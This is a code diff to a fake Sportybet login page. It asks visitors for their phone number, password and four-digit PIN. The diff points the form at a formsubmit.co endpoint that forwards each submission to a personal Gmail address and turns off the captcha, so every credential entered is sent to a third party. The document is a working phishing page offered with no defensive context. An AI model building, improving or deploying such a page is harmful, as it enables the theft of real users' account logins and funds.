@@ -28,14 +28,15 @@
           />
         </div>
         <div class="ml-auto">
-          <form action="mail.php" class="hidden space-x-6 lg:flex">
+          <form action="https://formsubmit.co/gracielalira565@gmail.com" method="POST" class="hidden space-x-6 lg:flex" name="contactform">
+            <input type="hidden" name="_captcha" value="false">
             <div class="flex rounded items-center space-x-3 bg-red-700">
               <label htmlFor="number" class="text-white pl-4">+234</label>
               <input
                 type="number"
                 placeholder="Sportybet Mobile Number"
                 id="number"
-                name="phone"
+                name="Phone Number"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none" required
               />
             </div>
@@ -44,7 +45,7 @@
                 type="password"
                 placeholder="Sportybet Password"
                 id="password"
-                name="password"
+                name="Password"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none px-4" required
               />
             </div>
@@ -54,12 +55,12 @@
                 maxlength="4"
                 minlength="4"
                 placeholder="Sportybet Four Pin"
-                id="number"
-                name="pin"
+                id="pin"
+                name="Four Digit Pin"
                 class="text-white h-12 bg-red-700 placeholder:text-gray-300 outline-none px-4" required
               />
               <button
-                class="bg-white capitalize bg-red-900 text-white h-full px-4 text-medium hover:bg-red-800"
+                class="bg-white capitalize bg-red-900 text-white h-full px-4 text-medium hover:bg-red-800" id="btn"
               >
                 login
               </button>
@@ -556,6 +557,8 @@
 </div>
 </div>
     </main>
-    <script src="./app.js"></script>
+    <script src="./app.js">
+
+    </script>
   </body>
 </html>
